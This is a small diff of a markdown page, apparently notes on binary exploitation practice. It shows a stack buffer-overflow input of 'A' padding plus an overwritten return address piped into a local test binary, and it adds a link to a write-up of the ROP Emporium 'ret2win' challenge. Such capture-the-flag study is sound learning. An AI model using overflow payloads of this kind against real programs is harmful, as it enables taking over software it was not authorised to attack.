@@ -439,3 +439,7 @@ Or perhaps something more Lispy?
 (def input "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x11\x40\x00\x00\x00\x00\x00")
 ($ ./a.out < ,input)
 ```
+
+## More Challenges
+
+I solved the first challenge from the ROPEmporium [here](ret2win.md).
